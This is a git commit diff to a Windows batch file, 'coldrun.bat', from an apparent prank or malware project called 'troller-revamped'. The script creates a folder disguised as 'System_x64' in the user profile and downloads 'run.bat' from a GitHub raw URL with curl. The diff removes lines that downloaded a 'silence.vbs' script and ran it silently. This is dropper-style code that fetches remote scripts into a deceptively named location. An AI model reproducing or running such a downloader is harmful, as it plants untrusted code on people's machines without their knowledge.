af0931307d9497fb9ad8e875f79ad8b48cb77bef
vexnity <159264249+vexnity@users.noreply.github.com>
2024-09-07 11:17:41 -0700

    Update coldrun.bat

--- coldrun.bat
+++ coldrun.bat
@@ -1,6 +1,5 @@
 cd %userprofile%
 mkdir System_x64
 cd System_x64
-curl -L "https://raw.githubusercontent.com/vexnity/troller-revamped/preview/silence.vbs" -o silence.vbs
+
 curl -L "https://raw.githubusercontent.com/vexnity/troller-revamped/main/run.bat" -o run.bat
-cscript //nologo silence.vbs
